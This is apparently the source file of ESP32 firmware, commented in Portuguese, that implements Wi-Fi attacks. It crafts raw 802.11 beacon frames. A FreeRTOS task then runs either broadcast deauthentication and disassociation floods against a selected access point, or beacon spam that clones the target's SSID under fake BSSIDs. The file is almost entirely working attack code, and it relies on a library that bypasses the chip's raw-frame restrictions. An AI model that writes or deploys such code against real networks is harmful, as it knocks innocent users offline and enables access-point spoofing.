#include "Attacks.h"
#include "Globals.h"
#include "esp_wifi.h"

extern "C" {
  #include "wsl_bypasser.h"
}

// Beacon frame deve ser 0x80 (Beacon), não 0x80,0x00
const uint8_t beacon_template[] = {
  0x80, 0x00,                         // Frame Control (Beacon frame)
  0x00, 0x00,                         // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (será substituído)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (será substituído)
  0x00, 0x00,                         // Sequence Control
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon interval (100ms)
  0x31, 0x04,                         // Capability info
  // SSID IE
  0x00,                               // IE ID (0x00 = SSID)
  0x00,                               // SSID length (será substituído)
  // SSID vai aqui
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24, // Supported rates
  0x03, 0x01, 0x01,                   // DS Parameter set (canal 1)
  0x05, 0x04, 0x01, 0x02, 0x00, 0x00  // Traffic Indication Map
};

void sendBeacon(const char* ssid, uint8_t* bssid, uint8_t channel, uint8_t seq_num) {
  uint8_t packet[256];
  int ssid_len = strlen(ssid);
  if (ssid_len > 32) ssid_len = 32;
  
  // Copiar template base
  memcpy(packet, beacon_template, sizeof(beacon_template));
  
  // O SSID IE começa na posição 36 do frame:
  //   0-1   Frame Control
  //   2-3   Duration
  //   4-9   Destination (broadcast)
  //   10-15 Source MAC
  //   16-21 BSSID
  //   22-23 Sequence Control
  //   24-31 Timestamp (8 bytes)
  //   32-33 Beacon Interval
  //   34-35 Capability Info
  //   36    IE ID 0x00 (SSID)
  //   37    SSID Length
  //   38..  SSID data
  int ssid_ie_offset = 36;
  packet[ssid_ie_offset + 1] = ssid_len;           // SSID Length
  memcpy(&packet[ssid_ie_offset + 2], ssid, ssid_len); // SSID data
  
  // Atualizar BSSID e Source
  memcpy(&packet[10], bssid, 6);  // Source
  memcpy(&packet[16], bssid, 6);  // BSSID
  
  // Copiar os IEs fixos (rates, DS param, TIM) após o SSID
  // No template eles começam logo após o byte de SSID length (posição 39)
  // O template possui o IE do SSID na posição 36 com length=0, portanto
  // os IEs fixos no template estão em: 36 + 2 + 0 = 38
  const int fixed_ies_template_offset = 38;
  const int fixed_ies_len = sizeof(beacon_template) - fixed_ies_template_offset;
  int fixed_ies_dest = ssid_ie_offset + 2 + ssid_len;
  memcpy(&packet[fixed_ies_dest], &beacon_template[fixed_ies_template_offset], fixed_ies_len);
  
  // Atualizar canal no DS Parameter Set IE
  // DS Param IE: ID(1) + Len(1) + Channel(1) = 3 bytes
  // Está após o Supported Rates IE (10 bytes: 0x01 0x08 + 8 rates)
  int ds_channel_offset = fixed_ies_dest + 10 + 2; // ID(10) + Len(11) + Channel(12)
  if (ds_channel_offset < 256) {
    packet[ds_channel_offset] = channel; // define o canal correto
  }
  
  // Número de sequência
  packet[22] = (seq_num << 4) & 0xF0;
  packet[23] = (packet[23] & 0x0F) | ((seq_num & 0xF0) >> 4);
  
  // Tamanho total correto: cabeçalho 802.11 + IEs fixos do template + SSID
  int total_size = fixed_ies_dest + fixed_ies_len;
  
  int result = wsl_bypasser_send_raw_frame(packet, total_size);
  if (result != ESP_OK) {
    Serial.printf("Erro ao enviar beacon: %d\n", result);
  }
}

void attackTask(void* parameter) {
  Serial.println("[ATTACK_TASK] Iniciada no Core 1");
  
  uint8_t beacon_seq = 0;
  
  while (attackTaskRunning) {
    
    // DEAUTHER
    if (deautherAtivo && radioLocked) {
      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {
        
        // Verificar canal
        uint8_t canal_atual;
        wifi_second_chan_t segundo;
        esp_wifi_get_channel(&canal_atual, &segundo);
        
        if (canal_atual != canalTravado) {
          esp_err_t err = esp_wifi_set_channel(canalTravado, WIFI_SECOND_CHAN_NONE);
          if (err != ESP_OK) {
            Serial.printf("Erro ao mudar canal: %d\n", err);
          }
        }
        
        // deauthTipo 0 = broadcast agressivo (todos os clientes)
        // deauthTipo 1 = broadcast + disassoc combinado (mais efetivo)
        if (deauthTipo == 0) {
          // Broadcast simples
          wsl_bypasser_send_deauth_frame(&apRecordSelecionado);
        } else {
          // Duplo: deauth + disassoc broadcast — força desconexão mais agressiva
          wsl_bypasser_send_deauth_frame(&apRecordSelecionado);
          wsl_bypasser_send_disassoc_frame(&apRecordSelecionado);
        }
        deauthCounter++;
        
        xSemaphoreGive(wifiMutex);
        
        vTaskDelay(pdMS_TO_TICKS(deauthTipo == 0 ? 200 : 80));
      }
    }
    
    // BEACON SPAM
    else if (beaconAtivo && radioLocked) {
      if (xSemaphoreTake(wifiMutex, pdMS_TO_TICKS(50))) {
        
        // Verificar canal primeiro
        uint8_t canal_atual;
        wifi_second_chan_t segundo;
        esp_wifi_get_channel(&canal_atual, &segundo);
        
        if (canal_atual != canalTravado) {
          esp_wifi_set_channel(canalTravado, WIFI_SECOND_CHAN_NONE);
        }
        
        // Gerar BSSID aleatório baseado no BSSID original
        uint8_t fake_bssid[6];
        memcpy(fake_bssid, apRecordSelecionado.bssid, 6);
        
        // Modificar os últimos bytes para criar clones
        static uint8_t last_byte = 0;
        fake_bssid[5] = last_byte++;
        
        // Enviar alguns beacons
        for (int i = 0; i < min(5, beaconQuantidade); i++) {
          sendBeacon(ssidSelecionado.c_str(), fake_bssid, 
                    apRecordSelecionado.primary, beacon_seq++);
          beaconCounter++;
          
          // Modificar BSSID para próximo clone
          fake_bssid[5]++;
          
          vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        xSemaphoreGive(wifiMutex);
        vTaskDelay(pdMS_TO_TICKS(100));
      }
    }
    
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  
  Serial.println("[ATTACK_TASK] Finalizando...");
  attackTaskHandle = NULL;
  vTaskDelete(NULL);
}
  

